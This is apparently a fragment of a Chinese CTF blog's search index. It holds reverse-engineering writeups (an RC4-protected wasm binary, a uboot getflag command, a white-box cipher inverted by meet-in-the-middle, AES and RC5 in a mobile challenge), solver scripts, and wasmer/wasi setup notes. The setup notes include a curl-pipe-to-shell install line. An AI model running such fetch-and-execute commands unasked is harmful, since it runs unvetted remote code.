[0xd, 0x9, 0xe, 0xb], [0xb, 0xd, 0x9, 0xe]] RCon = [0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000, 0x20000000, 0x40000000, 0x80000000, 0x1B000000, 0x36000000] S_BOX = [[54, 79, 98, 216, 181, 132, 205, 246, 220, 42, 230, 237, 171, 82, 1, 175], [208, 10, 104, 20, 39, 161, 219, 135, 156, 231, 41, 102, 53, 233, 180, 145], [139, 206, 243, 52, 86, 94, 35, 97, 112, 195, 167, 50, 45, 128, 12, 196], [245, 44, 114, 164, 201, 6, 185, 110, 25, 18, 7, 34, 214, 211, 0, 113], [152, 14, 107, 202, 100, 61, 186, 254, 136, 2, 227, 70, 239, 31, 47, 143], [46, 58, 49, 155, 240, 226, 123, 153, 187, 168, 72, 99, 212, 141, 244, 105], [191, 232, 75, 222, 218, 118, 176, 16, 184, 151, 198, 159, 22, 247, 172, 221], [69, 188, 197, 225, 173, 124, 91, 252, 204, 174, 89, 154, 111, 229, 103, 163], [88, 199, 140, 101, 129, 73, 83, 131, 64, 57, 93, 55, 177, 116, 142, 77], [207, 51, 248, 162, 117, 115, 250, 215, 74, 203, 130, 120, 23, 224, 149, 125], [8, 241, 189, 65, 183, 4, 15, 138, 209, 81, 62, 56, 147, 194, 137, 210], [150, 148, 26, 251, 95, 126, 96, 36, 84, 234, 127, 11, 27, 67, 38, 43], [28, 179, 78, 133, 63, 90, 192, 30, 80, 119, 255, 9, 228, 158, 37, 157], [5, 19, 238, 213, 48, 170, 40, 121, 134, 76, 249, 87, 109, 235, 71, 178], [217, 24, 182, 190, 122, 193, 160, 13, 92, 200, 165, 68, 106, 60, 32, 166], [3, 17, 59, 21, 144, 253, 146, 236, 169, 33, 85, 29, 223, 108, 66, 242]] I_SBOX = [[62, 14, 73, 240, 165, 208, 53, 58, 160, 203, 17, 187, 46, 231, 65, 166], [103, 241, 57, 209, 19, 243, 108, 156, 225, 56, 178, 188, 192, 251, 199, 77], [238, 249, 59, 38, 183, 206, 190, 20, 214, 26, 9, 191, 49, 44, 80, 78], [212, 82, 43, 145, 35, 28, 0, 139, 171, 137, 81, 242, 237, 69, 170, 196], [136, 163, 254, 189, 235, 112, 75, 222, 90, 133, 152, 98, 217, 143, 194, 1], [200, 169, 13, 134, 184, 250, 36, 219, 128, 122, 197, 118, 232, 138, 37, 180], [182, 39, 2, 91, 68, 131, 27, 126, 18, 95, 236, 66, 253, 220, 55, 124], [40, 63, 50, 149, 141, 148, 101, 201, 155, 215, 228, 86, 117, 159, 181, 186], [45, 132, 154, 135, 5, 195, 216, 23, 72, 174, 167, 32, 130, 93, 142, 79], [244, 31, 246, 172, 177, 158, 176, 105, 64, 87, 123, 83, 24, 207, 205, 107], [230, 21, 147, 127, 51, 234, 239, 42, 89, 248, 213, 12, 110, 116, 121, 15], [102, 140, 223, 193, 30, 4, 226, 164, 104, 54, 70, 88, 113, 162, 227, 96], [198, 229, 173, 41, 47, 114, 106, 129, 233, 52, 67, 153, 120, 6, 33, 144], [16, 168, 175, 61, 92, 211, 60, 151, 3, 224, 100, 22, 8, 111, 99, 252], [157, 115, 85, 74, 204, 125, 10, 25, 97, 29, 185, 221, 247, 11, 210, 76], [84, 161, 255, 34, 94, 48, 7, 109, 146, 218, 150, 179, 119, 245, 71, 202]] def SubBytes(self, State): # 字节替换 return [self.S_BOX[i][j] for i, j in [(_ \u003e\u003e 4, _ \u0026 0xF) for _ in State]] def SubBytes_Inv(self, State): # 字节逆替换 return [self.I_SBOX[i][j] for i, j in [(_ \u003e\u003e 4, _ \u0026 0xF) for _ in State]] def ShiftRows(self, S): # 行移位 return [S[ 0], S[ 5], S[10], S[15], S[ 4], S[ 9], S[14], S[ 3], S[ 8], S[13], S[ 2], S[ 7], S[12], S[ 1], S[ 6], S[11]] def Shift","date":"2020-10-26","objectID":"/tsctf202-re/:0:1","tags":null,"title":"TSCTF202-re","uri":"/tsctf202-re/"},{"categories":["writeup"],"content":"babywasm 题目描述中出现了wasi，稍微搜一下应该能搜到这份使用教程: https://docs.wasmer.io/integrations/c/setup 里面包含了很多c程序调用wasm代码的示例。这道题用了wasmer-c-api来构建,主程序为re, program.wasm为子程序。 对照着示例(eg: https://docs.wasmer.io/integrations/c/examples/host-functions)不难看出，ELF的main函数中首先导入boom函数到wasm的环境变量中，然后调用了wasm的start函数。 对program.wasm逆向分析.基础教程: https://xz.aliyun.com/t/5170 反汇编的话，可以把wasm转成c语言的格式，用wasm2c $ ./wasm2c wasm.wasm -o wasm.c ==\u003e 得到wasm.c和wasm.h 但是因为生成的c语言很长而且基本跟看wat没什么区别，所以需要再编译成二进制文件放到ida里面去看 将之前反编译出来的wasm.c，wasm.h，以及wabt项目内的wasm-rt.h，wasm-rt-impl.c，wasm-rt-impl.h三个文件放到同一个文件夹。 直接gcc wasm.c会报错，因为很多wasm的函数没有具体的实现。但是我们可以只编译不链接，我们关心的只是程序本身的逻辑，不需要真正编译出能运行的elf来。 $ gcc -c wasm.c -o wasm.o 得到的还未连接的elf文件wasm.o, 将wasm.o放到ida里面分析会比较清楚一些。 得到二进制文件后首先可以搜索一下字符串，可以发现一个特殊的字符串There is a fire in each one's heart，查找引用可以看到在init_memory中找到，这部分主要是初始化字符串，这个字符串存储在了w2c_memory + 2176的偏移处。 查看start函数，这个函数中引用了四个函数，在w2c_f9中调用了Z_envZ_boomZ_ii，这个函数是在ELF中导入的，所以这里应该是程序的关键点。 __int64 __fastcall w2c_f9(__m128i a1) { int v1; // ST30_4 int v2; // ST34_4 unsigned int v3; // ST38_4 unsigned int v4; // ST3C_4 unsigned int v5; // ST6C_4 unsigned int v7; // [rsp+Ch] [rbp-64h] if ( ++wasm_rt_call_stack_depth \u003e 0x1F4u ) wasm_rt_trap(7LL); w2c_g0 -= 16; v7 = w2c_g0; i32_store(\u0026w2c_memory, (unsigned int)w2c_g0 + 12LL, 0); i32_store(\u0026w2c_memory, v7, 2752); w2c_f11(1024u, v7, a1); v1 = w2c_f106(2752u); i32_store(\u0026w2c_memory, v7 + 8LL, v1); v2 = w2c_f63(256LL); i32_store(\u0026w2c_memory, v7 + 4LL, v2); v3 = i32_load(\u0026w2c_memory, v7 + 4LL); w2c_f7(v3, 2176LL, 36LL); v4 = i32_load(\u0026w2c_memory, v7 + 4LL); v5 = i32_load(\u0026w2c_memory, v7 + 8LL); w2c_f8(v4, 2752LL, v5); if ( (unsigned int)Z_envZ_boomZ_ii(2752LL) == 0 ) w2c_f103(1034LL, 0LL); else w2c_f103(1027LL, 0LL); w2c_g0 = v7 + 16; --wasm_rt_call_stack_depth; return 0LL; } 在这个函数中首先调用了w2c_f11函数，参数是1024，猜测是字符串内容，可以找到1024偏移处字符串的值(0x39480 - 2147 + 1024 -\u003e 0x3901d),这个地方的字符串是%s所以这个地方应该是scanf函数。输入的字符串存储在2752处。w2c_f106的参数是输入字符串的位置，里面的代码很明显时求输入字符串的长度。长度存储在v7 + 8LL处。 然后将一个与输入无关的函数w2c_f63返回值存储在v7 + 4LL处，然后w2c_f7(v3, 2176LL, 36LL);这个函数第一个参数时w2c_f63的返回值，第二个参数是There is a fire in each one's heart这个字符串，第三个参数是字符串的长度加1. 进入w2c_f7这个函数内部可以发现，进行了两个循环，每个循环执行256次，第一个循环中对长度取模(第三个参数)，第二个循环中对256取模。这时候应该猜测出来是RC4(当然不猜直接看也还比较容易看懂，就是数据赋值变成了store和load而已，给了流密钥的提示就更容易看了)。 所以w2c_f7这个函数是密钥的初始化，随后调用w2c_f8(v4, 2752LL, v5)，第一个参数是初始化变换后的密钥，第二个参数是输入的字符串，第三个参数是字符串的长度（这个函数中的加密也有对256取模 \u0026 数据交换的各种操作） 在加密完成过后调用Z_envZ_boomZ_ii函数，通过打印Right。 solve from Crypto.Cipher import ARC4 def myRC4(data,key): rc41 = ARC4.new(key) encrypted = rc41.encrypt(data) return encrypted.encode('hex').upper() enc = [0xbf, 0xcf, 0x61, 0x4c, 0xed, 0x4c, 0x29, 0x24, 0x5, 0x8a, 0x60, 0x87, 0x35, 0x81, 0x73, 0xf, 0xde, 0x96, 0x65, 0xa5, 0x41, 0x18, 0xac, 0xf5, 0x1c, 0x42, 0xda, 0x26, 0x96, 0xad, 0x35, 0xde, 0xf4, 0xc3, 0xcd, 0x1c, 0x96, 0xeb] s = \"\".join(chr(i) for i in enc) key = \"There is a fire in each one's heart\\0\"# 因为初始化密钥的长度比这个字符串的长度长1，所以记得补个0，当然如果找的是实现代码可以直接用长度36 enc = myRC4(s, key) print enc.decode('hex') ","date":"2020-10-26","objectID":"/tsctf202-re/:0:2","tags":null,"title":"TSCTF202-re","uri":"/tsctf202-re/"},{"categories":["writeup"],"content":"babybios 这道题在uboot arm的bios里添加了一个getflag指令。在指令的回调函数里实现了对flag的校验逻辑。动态调试可以使用gdb-multiarch+qemu去调试，静态直接用IDA分析即可。 这道题的关键是找到指令的回调函数，而线索就是uboot在添加和搜索指令的机制。https://blog.csdn.net/itxiebo/article/details/50991049 观察cmd_tbl结构体可以发现，结构体包含了命令名字符串指针name，回调函数指针cmd，命令帮助字符串指针help。 struct cmd_tbl { char *name; /* Command Name */ int maxargs; /* maximum number of arguments */ /* * Same as -\u003ecmd() except the command * tells us if it can be repeated. * Replaces the old -\u003erepeatable field * which was not able to make * repeatable property different for * the main command and sub-commands. */ int (*cmd_rep)(struct cmd_tbl *cmd, int flags, int argc, char *const argv[], int *repeatable); /* Implementation function */ int (*cmd)(struct cmd_tbl *cmd, int flags, int argc, char *const argv[]); char *usage; /* Usage message (short) */ #ifdef CONFIG_SYS_LONGHELP char *help; /* Help message (long) */ #endif #ifdef CONFIG_AUTO_COMPLETE /* do auto completion on the arguments */ int (*complete)(int argc, char *const argv[], char last_char, int maxv, char *cmdv[]); #endif }; 那么在IDA中搜索命令名字符串指针，也就是getflag字符串的指针0x88EEA，就找到了下图的位置（IDA按D键可以修改数据的类型）。 对照cmd_tbl结构体，能够确定命令回调函数的地址为0x11A00。反编译这个函数。 逆一下几个函数，基本能够确定流程，sub_116D8函数对输入做base64解码，sub_118A8函数之后的部分首先填充了一个9*9的数独，之后对数独进行校验。 把数独从ida中抠出来放进在线数独求解器，再做base64编码，就得到了flag。 ","date":"2020-10-26","objectID":"/tsctf202-re/:0:3","tags":null,"title":"TSCTF202-re","uri":"/tsctf202-re/"},{"categories":["writeup"],"content":"wbenc 这道题来自某IoT设备中的白盒加密(white box encrypt)。 加密分为三个部分，第一和第三部分进行了一些简单的变换，可以直接逆向。 中间的大段代码需要花功夫逆一下。 逆向之后，整个中间部分共有10轮，每一轮的操作如下。 v13 = int32_split(magic_tbl[buf[5] | 0x100] ^ magic_tbl[buf[0]] ^ magic_tbl[buf[10] | 0x200] ^ magic_tbl[buf[15] | 0x300]) v15 = int32_split(magic_tbl[buf[4] | 0x400] ^ magic_tbl[buf[9] | 0x500] ^ magic_tbl[buf[14] | 0x600] ^ magic_tbl[buf[3] | 0x700]) v17 = int32_split(magic_tbl[buf[13] | 0x900] ^ magic_tbl[buf[8] | 0x800] ^ magic_tbl[buf[2] | 0xA00] ^ magic_tbl[buf[7] | 0xB00]) v18 = int32_split(magic_tbl[buf[11] | 0xF00] ^ magic_tbl[buf[1] | 0xD00] ^ magic_tbl[buf[12] | 0xC00] ^ magic_tbl[buf[6] | 0xE00]) 分析可知，这四行代码的是独立的，也就是每行的4byte输入转换为4byte输出。那么对这样的4byte变换直接暴破的话，时间复杂度高。2^32很难在普通计算机下暴破。 我们可以利用中间相遇攻击的思想对暴力破解进行优化。例如我们对下面的第一行进行逆向（暴破）。 v13 = int32_split(magic_tbl[buf[5] | 0x100] ^ magic_tbl[buf[0]] ^ magic_tbl[buf[10] | 0x200] ^ magic_tbl[buf[15] | 0x300]) 首先枚举所有可能的magic_tbl[buf[5] | 0x100] ^ magic_tbl[buf[0]]这样一个异或和，也就是0xff * 0xff种可能，存储在一张有序表当中。 再枚举所有的magic_tbl[buf[10] | 0x200] ^ magic_tbl[buf[15] | 0x300]，也就是后面两个字节的异或和，把异或的结果和v13去做异或，得到的值在前面存储的表中查询是否存在，有序表的查询操作时间复杂度是O(logn)。 如果存在，那么说明我们找到了一组(buf[5],buf[0]],buf[10],buf[15])，满足magic_tbl[buf[5] | 0x100] ^ magic_tbl[buf[0]] ^ magic_tbl[buf[10] | 0x200] ^ magic_tbl[buf[15] | 0x300]=v13，也就是从输出的4byte逆向得到了输入的4byte。 利用这样一个空间换时间的优化，能够在可以接受的时间复杂度下逆向得到输入。 之后编写解密脚本就能够从输出获得输入。 解密脚本如下 import sys magic_tbl = [] def loadTable(filename): global magic_tbl fp = open(filename, 'r') content = fp.read() fp.close() content = content.split(' ') content = [int(content[i], 16) for i in xrange(len(content))] tbl = [content[i] | content[i+1]\u003c\u003c8 | content[i+2]\u003c\u003c16 | content[i+3]\u003c\u003c24 for i in xrange(0, len(content), 4)] print hex(len(tbl)) magic_tbl = tbl def listDump(l): for x in xrange(len(l)): print hex(l[x]), print '' def int32_split(x): return [x \u0026 0xff, (x \u003e\u003e 8) \u0026 0xff, (x \u003e\u003e 16) \u0026 0xff, (x \u003e\u003e 24) \u0026 0xff] def ROTR(ch, n, sz): tmp = ((ch \u003e\u003e (n%sz)) | (ch \u003c\u003c (sz - (n % sz) ))) \u0026 ((1 \u003c\u003c sz) - 1) return tmp def ROTL(ch, n, sz): tmp = ((ch \u003c\u003c (n%sz)) | (ch \u003e\u003e (sz - (n % sz) ))) \u0026 ((1 \u003c\u003c sz) - 1) return tmp def decode(input): buf = [0] * 16 # ROT decode v64 = 0 v66 = 0 v68 = 0 v70 = 0 for i in xrange(16): tmp = ord(input[i]) ^ v64 buf[i] = ROTR(tmp, i*2, 8) v64 += 0xd v66 += 0xca v68 += 0x73 v70 += 0x9b #listDump(buf) #print buf v56 = int32_split(buf[0] | (buf[1] \u003c\u003c 8) | (buf[2] \u003c\u003c 16) | (buf[3] \u003c\u003c 24)) v57 = int32_split(buf[4] | (buf[5] \u003c\u003c 8) | (buf[6] \u003c\u003c 16) | (buf[7] \u003c\u003c 24)) v67 = int32_split(buf[8] | (buf[9] \u003c\u003c 8) | (buf[10] \u003c\u003c 16) | (buf[11] \u003c\u003c 24)) v71 = int32_split(buf[12] | (buf[13] \u003c\u003c 8) | (buf[14] \u003c\u003c 16) | (buf[15] \u003c\u003c 24)) # MITM attack # init def get_dict(x, y): dic = {} for i in xrange(256): for j in xrange(256): tmp = magic_tbl[i | x] ^ magic_tbl[j | y] dic[tmp] = [i, j] return dic def mitm(dic, res, u, v): res = res[0] | res[1] \u003c\u003c 8 | res[2] \u003c\u003c 16 | res[3] \u003c\u003c 24 for i in xrange(256): for j in xrange(256): tmp = magic_tbl[i | u] ^ magic_tbl[j | v] tmp ^= res if dic.has_key(tmp): [k, l] = dic[tmp] #print [i, j, k, l] return [i, j, k, l] # round 9 v51 = [0] * 4 v52 = [0] * 4 v53 = [0] * 4 v55 = [0] * 4 v55[3], v53[2], v52[1], v51[0] = mitm(get_dict(0x9100, 0x9000), v56, 0x9300, 0x9200) v52[0], v53[1], v55[2], v51[3] = mitm(get_dict(0x9600, 0x9700), v57, 0x9400, 0x9500) v51[2], v55[1], v53[0], v52[3] = mitm(get_dict(0x9800, 0x9B00), v67, 0x9A00, 0x9900) v51[1], v55[0], v52[2], v53[3] = mitm(get_dict(0x9E00, 0x9F00), v71, 0x9D00, 0x9C00) # round 8 v47 = [0] * 4 v48 = [0] * 4 v49 = [0] * 4 v50 = [0] * 4 v49[2], v48[1], v47[0], v50[3] = mitm(get_dict(0x8000, 0x8300), v51, 0x8200, 0x8100) v48[0], v49[1], v50[2], v47[3] = mitm(get_dict(0x8600, 0x8700), v52, 0x8400, 0x8500) v49[0], v50[1], v47[2], v48[3] = mitm(get_dict(0x8A00, 0x8B00), v53, 0x8800, 0x8900) v49[3], v50[0], v47[1], v48[2] = mitm(get_dict(0x8D00, 0x8E00), v55, 0x8F00, 0x8C00) # round 7 v42 = [0] * 4 v43 = [0] * 4 v44 = [0] * 4 v46 = [0] * 4 v44[2], v43[1], v42[0], v46[3] = mitm(get_dict(0x7000, 0x7300), v47, 0x7200,","date":"2020-10-26","objectID":"/tsctf202-re/:0:4","tags":null,"title":"TSCTF202-re","uri":"/tsctf202-re/"},{"categories":["writeup"],"content":".c编译成.wasm 第一个工具: wasmcc 安装 curl https://raw.githubusercontent.com/wasienv/wasienv/master/install.sh | sh https://github.com/wasienv/wasienv 其中安装完成之后会包含很多个工具，wasirun可以运行wasm代码 $ wasirun hello.wasm Hello wasi emscripten https://segmentfault.com/a/1190000014208777 git clone https://github.com/juj/emsdk.git cd emsdk emsdk update emsdk install latest emsdk activate latest //如果没有出现emcc命令: source ./emsdk_env.sh 编译命令：emcc hello.c -s WASM=1 -o hello.wasm ","date":"2020-10-20","objectID":"/wasi%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/:1:0","tags":null,"title":"wasi使用笔记","uri":"/wasi%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"},{"categories":["writeup"],"content":"c代码调用wasm代码 https://docs.wasmer.io/integrations/c/setup 环境设置: # Extract the contents to a dir mkdir wasmer-c-api tar -C wasmer-c-api -zxvf wasmer-c-api*.tar.gz export WASMER_C_API=`pwd`/wasmer-c-api # Update LD_LIBRARY_PATH to link against the libwasmer.so in the examples export LD_LIBRARY_PATH=`pwd`/wasmer-c-api/lib/:$LD_LIBRARY_PATH 编译命令: 静态链接：gcc test.c -I${WASMER_C_API}/include -L${WASMER_C_API}/lib -lwasmer -o test 动态链接：gcc -static main.c -I${WASMER_C_API}/include -L${WASMER_C_API}/lib -lwasmer -lpthread -lm -ldl -o main 例子 在这里有很多wasi使用的例子 https://docs.wasmer.io/integrations/c/setup 但是没看见直接运行整个wasm代码的(例子是调用wasm函数的) // wasm部分 #include\u003cstdio.h\u003e int main() { char s[20] = {0}; scanf(\"%s\", s); puts(s); return 0; } // c部分 #include \u003cstdio.h\u003e #include \"wasmer.h\" #include \u003cassert.h\u003e #include \u003cstdint.h\u003e // Function to print the most recent error string from Wasmer if we have them void print_wasmer_error() { int error_len = wasmer_last_error_length(); char *error_str = malloc(error_len); wasmer_last_error_message(error_str, error_len); printf(\"Error: `%s`\\n\", error_str); } int main() { FILE *file = fopen(\"hello.wasm\", \"r\"); assert(file != NULL); fseek(file, 0, SEEK_END); long len = ftell(file); uint8_t *bytes = (uint8_t*)malloc(len); fseek(file, 0, SEEK_SET); fread(bytes, 1, len, file); fclose(file); wasmer_module_t *module = NULL; wasmer_result_t compile_result = wasmer_compile(\u0026module, bytes, len); if (compile_result != WASMER_OK) { print_wasmer_error(); return -1; } wasmer_import_object_t *wasi_import_obj = wasmer_wasi_generate_default_import_object(); // find out what version of WASI the module is Version wasi_version = wasmer_wasi_get_version(module); // char* progname = \"ProgramName\"; // wasmer_byte_array args[] = { { .bytes = progname; .bytes_len = sizeof(progname); } }; wasmer_import_object_t * import_object = wasmer_wasi_generate_import_object_for_version(wasi_version, 0, 1, NULL, 0, NULL, 0, NULL, 0); // Instantiate a WebAssembly Instance from Wasm bytes and imports wasmer_instance_t *instance = NULL; // clock_gettime(CLOCK_REALTIME, \u0026start); wasmer_result_t instantiate_result = wasmer_module_import_instantiate(\u0026instance, module, import_object); if(instantiate_result != WASMER_OK) { print_wasmer_error(); return -1; } wasmer_value_t arguments[] = {0}; wasmer_value_t results[] = {0}; // Call the `sum` function with the prepared arguments and the return value. wasmer_result_t call_result = wasmer_instance_call(instance, \"_start\", arguments, 0, results, 1); int response_value = results[0].value.I32; printf(\"%d\\n\", response_value); wasmer_instance_destroy(instance); return 0; } 调用_start函数相当于运行整个wasm代码 ","date":"2020-10-20","objectID":"/wasi%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/:2:0","tags":null,"title":"wasi使用笔记","uri":"/wasi%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"},{"categories":["writeup"],"content":"AES 前面是AES加密，把AES的四个步骤拼在一起了，然后S盒是动态生成的，可以调试的时候看一下是不是S盒的特征数字(当然也有时候会换掉标准的S盒） 我稍微记一下这种AES的步骤 密钥生成 long double __fastcall sub_7FA04C1AC4(unsigned int *a1, __int64 a2, __int128 *a3) { v3 = 0LL; v4 = bswap32(*a1); *(_DWORD *)a3 = v4; *((_DWORD *)a3 + 1) = bswap32(a1[1]); *((_DWORD *)a3 + 2) = bswap32(a1[2]); v5 = a3 + 1; *((_DWORD *)a3 + 3) = bswap32(a1[3]); do { v6 = *((unsigned int *)v5 - 1); v7 = unk_7FA04C5E20[0].n128_u32[v3]; ++v3; v4 ^= v7 ^ (((stru_7FA04C5040[0].n128_u8[(v6 \u003e\u003e 16) \u0026 0xFF] \u003c\u003c 24) \u0026 0xFF00FFFF | (stru_7FA04C5040[0].n128_u8[(unsigned __int16)v6 \u003e\u003e 8] \u003c\u003c 16)) \u0026 0xFFFF00FF | (stru_7FA04C5040[0].n128_u8[(unsigned __int8)v6] \u003c\u003c 8) | stru_7FA04C5040[0].n128_u8[v6 \u003e\u003e 24]); v8 = *((_DWORD *)v5 - 2); v9 = v4 ^ *((_DWORD *)v5 - 3); *(_DWORD *)v5 = v4; *((_DWORD *)v5 + 1) = v9; v10 = v9 ^ v8; *((_DWORD *)v5 + 2) = v10; *((_DWORD *)v5 + 3) = v10 ^ v6; ++v5; } while ( v3 != 10 ); v11 = a3[9]; v13 = a3[7]; v12 = a3[8]; a3[11] = a3[10]; a3[12] = v11; v14 = a3[5]; v15 = a3[6]; a3[13] = v12; a3[14] = v13; v17 = a3[3]; result = *((long double *)a3 + 4); a3[15] = v15; a3[16] = v14; v18 = *a3; v20 = a3[1]; v19 = a3[2]; *((long double *)a3 + 17) = result; a3[18] = v17; a3[21] = v18; a3[19] = v19; a3[20] = v20; return result; } 加密 if ( v7 ) { v9 = 0; do { v10 = *v6; BYTE4(v75) = v6[1]; v11 = v10 ^ (v79 \u003e\u003e 24); v12 = BYTE4(v75) ^ (v79 \u003e\u003e 16); v13 = 0LL; LOBYTE(v76) = v6[2]; v14 = (unsigned __int8)v76 ^ (v79 \u003e\u003e 8); BYTE4(v76) = v6[3]; v15 = BYTE4(v76) ^ v79; v16 = v6[4]; v17 = v6[5]; BYTE1(v76) = v6[6]; v18 = v16 ^ (v80 \u003e\u003e 24); v19 = v17 ^ (v80 \u003e\u003e 16); v20 = BYTE1(v76) ^ (v80 \u003e\u003e 8); BYTE5(v76) = v6[7]; v21 = BYTE5(v76) ^ v80; v22 = v6[8]; v23 = v6[9]; v24 = v6[10]; BYTE6(v76) = v6[11]; v25 = v22 ^ (v81 \u003e\u003e 24); v26 = v23 ^ (v81 \u003e\u003e 16); v27 = v24 ^ (v81 \u003e\u003e 8); v28 = BYTE6(v76) ^ v81; v29 = v6[14]; v30 = v6[15]; v31 = v6[12] ^ (v82 \u003e\u003e 24); v32 = v6[13] ^ (v82 \u003e\u003e 16); v33 = v29 ^ (v82 \u003e\u003e 8); v34 = v30 ^ v82; LOBYTE(v75) = v11; BYTE1(v75) = v18; BYTE2(v75) = v25; BYTE4(v75) ^= BYTE2(v79); BYTE5(v75) = v19; BYTE6(v75) = v26; LOBYTE(v76) = v76 ^ BYTE1(v79); BYTE1(v76) ^= BYTE1(v80); BYTE2(v76) = v27; BYTE4(v76) ^= v79; BYTE5(v76) ^= v80; BYTE6(v76) ^= v81; BYTE3(v75) = v31; HIBYTE(v75) = v32; BYTE3(v76) = v29 ^ BYTE1(v82); HIBYTE(v76) = v30 ^ v82; do { v35 = stru_7FA04C5040[0].n128_u8[(unsigned __int8)v11]; v36 = stru_7FA04C5040[0].n128_u8[(unsigned __int8)v18]; v37 = stru_7FA04C5040[0].n128_u8[(unsigned __int8)v25]; v38 = stru_7FA04C5040[0].n128_u8[(unsigned __int8)v31]; v39 = stru_7FA04C5040[0].n128_u8[(unsigned __int8)v12]; v40 = stru_7FA04C5040[0].n128_u8[(unsigned __int8)v26]; v41 = stru_7FA04C5040[0].n128_u8[(unsigned __int8)v32]; v42 = stru_7FA04C5040[0].n128_u8[(unsigned __int8)v14]; v43 = stru_7FA04C5040[0].n128_u8[(unsigned __int8)v20]; v44 = stru_7FA04C5040[0].n128_u8[(unsigned __int8)v27]; v45 = stru_7FA04C5040[0].n128_u8[(unsigned __int8)v33]; v46 = stru_7FA04C5040[0].n128_u8[v15]; v47 = stru_7FA04C5040[0].n128_u8[v21]; v48 = stru_7FA04C5040[0].n128_u8[v28]; v49 = stru_7FA04C5040[0].n128_u8[v34]; BYTE4(v75) = stru_7FA04C5040[0].n128_u8[(unsigned __int8)v19]; LOBYTE(v75) = v35; BYTE1(v75) = v36; BYTE2(v75) = v37; BYTE3(v75) = v38; BYTE5(v75) = v40; BYTE6(v75) = v41; HIBYTE(v75) = v39; LOBYTE(v76) = v44; BYTE1(v76) = v45; BYTE2(v76) = v42; BYTE3(v76) = v43; BYTE4(v76) = v49; BYTE5(v76) = v46; BYTE6(v76) = v47; HIBYTE(v76) = v48; sub_7FA04C1EE0((__int128 *)\u0026v75); v50 = *(unsigned int *)((char *)\u0026v79 + v13 + 16); v51 = *(unsigned int *)((char *)\u0026v79 + v13 + 20); v11 = (unsigned __int8)v75 ^ (v50 \u003e\u003e 24); v12 = BYTE4(v75) ^ (v50 \u003e\u003e 16); v14 = (unsigned __int8)v76 ^ (v50 \u003e\u003e 8); v15 = BYTE4(v76) ^ v50; v53 = *(unsigned int *)((char *)\u0026v79 + v13 + 24); v52 = *(unsigned int *)((char *)\u0026v79 + v13 + 28); v18 = BYTE1(v75) ^ (v51 \u003e\u003e 24); v19 = BYTE5(v75) ^ (v51 \u003e\u003e 16); v20 = BYTE1(v76) ^ (v51 \u003e\u003e 8); v21 = BYTE5(v76) ^ v51; v13 += 16LL; v25 = BYTE2(v75) ^ (v53 \u003e\u003e 24); v26 = BYTE6(v75) ^ (v53 \u003e\u003e 16); v27 = BYTE2(v76) ^ (v53 \u003e\u003e 8); v28 = BYTE6(","date":"2020-10-20","objectID":"/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF-mobile%E9%A2%98%E8%A7%A3/:1:0","tags":null,"title":"钓鱼城杯-mobile题解","uri":"/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF-mobile%E9%A2%98%E8%A7%A3/"},{"categories":["writeup"],"content":"RC5 然后找到RC5的magic number以为自己要出了，结果一直解密到结束都没解密出来，菜狗罢了。 RC5的magic number: v8 = 0xB7E15163; // 0xB7E15163就是-0x481EAE9D v9 = malloc(0x20u); v10 = vcvtmd_u64_f64((sqrt(5.0) + -1.0) * 2147483650.0); // 0x9E3779B9 dword_7FA04C5E60[0] = 0xB7E15163; unk_7FA04C5E64 = v10 - 0x481EAE9D; unk_7FA04C5E68 = v10 - 0x481EAE9D + v10; unk_7FA04C5E6C = v10 - 0x481EAE9D + v10 + v10; RC5支持可变的块大小(32、64或128比特)，密钥长度（0至2040位）和加密轮数（0～255）。最初建议选择的参数是64位的块大小，128位的密钥和12轮加密。 RC5的一个关键特征是使用基于数据的置换。RC5的其中一个目标是促进对于这类作为原始密码的操作的研究和评估。RC5也包括一些的取模加法和逻辑异或(XOR)运算。这个加密的一般结构是一种类费斯妥网络。加密和解密程序可以用几行代码写完，但密钥的生成算法更复杂。密钥扩展使用了e和黄金比例代入一个单向函数，将所得值作为“袖子里是空的”数字（即无任何来源依据的魔法数字）。算法的诱人的简洁性和基于数据的置换的特性，让RC5吸引了众多密码研究人员将其作为研究对象。 RC5通常被记为RC5-w/r/b，w=字的大小（以bit为单位），r=加密轮数，b=密钥的字节数。 解RC5最主要的是确定密钥的长度，轮数，块大小以及padding的内容 这里padding的方式是PKCS#7，基本长度是8。密钥长度是32字节(这里被坑了，以为是16，IDA里OWord表示16字节)，轮数是12，块大小是32 记一份标准RC5加解密的python算法： https://github.com/tbb/pyRC5 class RC5: def __init__(self, w, R, key, strip_extra_nulls=False): self.w = w # block size (32, 64 or 128 bits) self.R = R # number of rounds (0 to 255) self.key = key # key (0 to 2040 bits) self.strip_extra_nulls = strip_extra_nulls # some useful constants self.T = 2 * (R + 1) self.w4 = w // 4 self.w8 = w // 8 self.mod = 2 ** self.w self.mask = self.mod - 1 self.b = len(key) self.__keyAlign() self.__keyExtend() self.__shuffle() def __lshift(self, val, n): n %= self.w return ((val \u003c\u003c n) \u0026 self.mask) | ((val \u0026 self.mask) \u003e\u003e (self.w - n)) def __rshift(self, val, n): n %= self.w return ((val \u0026 self.mask) \u003e\u003e n) | (val \u003c\u003c (self.w - n) \u0026 self.mask) def __const(self): # constants generation if self.w == 16: return 0xB7E1, 0x9E37 # return P, Q values elif self.w == 32: return 0xB7E15163, 0x9E3779B9 elif self.w == 64: return 0xB7E151628AED2A6B, 0x9E3779B97F4A7C15 def __keyAlign(self): if self.b == 0: # key is empty self.c = 1 elif self.b % self.w8: self.key += b'\\x00' * (self.w8 - self.b % self.w8) # fill key with \\x00 bytes self.b = len(self.key) self.c = self.b // self.w8 else: self.c = self.b // self.w8 L = [0] * self.c for i in range(self.b - 1, -1, -1): L[i // self.w8] = (L[i // self.w8] \u003c\u003c 8) + self.key[i] self.L = L def __keyExtend(self): P, Q = self.__const() self.S = [(P + i * Q) % self.mod for i in range(self.T)] def __shuffle(self): i, j, A, B = 0, 0, 0, 0 for k in range(3 * max(self.c, self.T)): A = self.S[i] = self.__lshift((self.S[i] + A + B), 3) B = self.L[j] = self.__lshift((self.L[j] + A + B), A + B) i = (i + 1) % self.T j = (j + 1) % self.c def encryptBlock(self, data): A = int.from_bytes(data[:self.w8], byteorder='little') B = int.from_bytes(data[self.w8:], byteorder='little') A = (A + self.S[0]) % self.mod B = (B 